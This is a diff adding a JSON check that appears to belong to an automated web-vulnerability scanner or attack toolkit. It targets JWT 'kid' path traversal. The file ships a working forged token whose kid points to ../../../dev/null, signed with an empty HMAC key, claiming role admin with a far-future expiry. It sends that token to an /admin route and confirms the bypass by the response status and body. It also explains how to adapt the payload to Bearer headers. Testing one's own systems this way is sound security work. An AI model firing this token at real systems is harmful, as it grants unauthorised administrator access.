@@ -1,0 +1,41 @@
+{
+  "name": "web/JWT kid path-traversal empty-key acceptance",
+  "description": "[critical] GOD TIER — PortSwigger JWT kid-injection technique: kid is loaded as a FILE PATH for the HMAC secret, so kid=../../../dev/null forces the verification key to the EMPTY string; the shipped token is genuinely HMAC'd with an empty key (real crypto in the pack). A 200 with role:admin on the protected route while the no-token baseline is 401 = forged-claim ACCEPTANCE. Keywords: jwt kid path traversal none key hmac forgery cwe-347 auth bypass. ctrl: benign run (kid rejected/verified properly) returns 401 -> status condition fails -> not falsified. base_url = app root; skill rides /admin?access_token= (copy for Authorization: Bearer targets).",
+  "cwe": "CWE-347",
+  "requests": {
+    "baseline": {
+      "method": "GET",
+      "url": "{{base_url}}/admin"
+    },
+    "payload": {
+      "method": "GET",
+      "url": "{{base_url}}/admin?access_token=eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uL2Rldi9udWxsIn0.eyJzdWIiOiJwcm9iZSIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.dPgyhyYWCDCM5vtMs0bOqW1o1V2C-kZFgNZAwClg8nM"
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "payload",
+      "equals": 200
+    },
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "\\\"role\\\"\\s*:\\s*\\\"admin\\\"",
+      "present": true
+    },
+    {
+      "type": "status",
+      "request": "baseline",
+      "equals": 401
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "c24153c4da27",
+  "created": "2026-11-05T19:30:06.502181+00:00",
+  "last_used": "2026-11-05T19:30:06.502181+00:00"
+}
